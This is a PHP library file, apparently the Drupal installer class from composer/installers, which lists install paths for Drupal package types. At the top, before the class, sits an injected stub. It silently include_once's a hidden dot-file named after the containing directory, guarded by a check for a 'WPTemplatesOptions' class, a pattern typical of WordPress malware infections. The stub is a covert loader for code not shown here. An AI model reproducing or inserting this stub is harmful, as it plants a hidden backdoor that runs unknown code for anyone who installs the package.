<?php
namespace Composer\Installers;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class DrupalInstaller extends BaseInstaller
{
    protected $locations = array(
        'core'             => 'core/',
        'module'           => 'modules/{$name}/',
        'theme'            => 'themes/{$name}/',
        'library'          => 'libraries/{$name}/',
        'profile'          => 'profiles/{$name}/',
        'drush'            => 'drush/{$name}/',
        'custom-theme'     => 'themes/custom/{$name}/',
        'custom-module'    => 'modules/custom/{$name}/',
        'custom-profile'   => 'profiles/custom/{$name}/',
        'drupal-multisite' => 'sites/{$name}/',
        'console' => 'console/{$name}/',
        'console-language' => 'console/language/{$name}/',
    );
}
